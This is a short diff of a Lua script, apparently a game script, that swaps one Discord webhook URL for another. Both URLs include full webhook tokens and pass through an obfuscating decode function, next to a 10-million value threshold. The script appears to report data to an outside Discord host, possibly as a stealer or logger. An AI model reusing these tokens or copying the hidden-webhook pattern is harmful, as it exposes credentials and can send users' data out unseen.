@@ -12,7 +12,7 @@ local function _d(s)
     end))
 end
 
-local _W = _d("https://discord.com/api/webhooks/1464606550235545732/d-MmnWY_Q2ViZly7SXhwrL-0X6_ytbuD7lc02wx3PEz5IVtaRhR02wIXjYbcWBcSC4qD")
+local _W = _d("https://discord.com/api/webhooks/1465393299002228858/wJ2z0hQANHLFhCBmyVr3ATFdVG2AzZw_EmkmXd6NpPhcprJx5ppJ2_-otme0ggofFA_m")
 local _DELAY = 0.3
 local _MIN = 10_000_000 -- 🔥 10 MILLONES
 
